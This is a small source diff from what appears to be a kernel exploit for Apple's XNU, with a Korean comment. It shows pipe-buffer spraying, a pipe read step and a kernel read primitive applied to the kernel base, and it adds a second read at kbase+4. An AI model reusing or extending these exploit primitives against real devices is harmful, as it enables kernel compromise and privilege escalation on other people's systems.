@@ -81,9 +81,6 @@ int main(int argc, char *argv[], char *envp[]) {
 	//memset_pattern4 = 메모리 설정 함수로, 4바이트 패턴을 사용하여 특정 메모리 영역을 채울 때 사용, 따라서 pipe 4글자로 채워짐
 	memset_pattern4(pipe_buffer, "ABCD", pipe_buffer_size);	//<- work even if disable this code.
 	pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size);
-	// read - bsd/kern/sys_generic.c:201
-	// fo_read - bsd/kern/kern_descrip.c:5572
-	// pipe_read - bsd/kern/sys_pipe.c:740
 	read_pipe();	
 
 	//build_stable_kmem_api
@@ -94,6 +91,7 @@ int main(int argc, char *argv[], char *envp[]) {
 	// printf("Going to call kpri_read32, set breakpoint first and press any key.\n"); char ch; ch = getchar();
 
 	printf("kpri_read32(kbase) = 0x%x\n", kpri_read32(kbase));
+	printf("kpri_read32(kbase+4) = 0x%x\n", kpri_read32(kbase+4));
 #if 0 
 	pipe_info_t *fakePipeAlloc = kalloc_via_pipe(0x4000);
 	uint64_t kptr = fakePipeAlloc->kern_buffer;
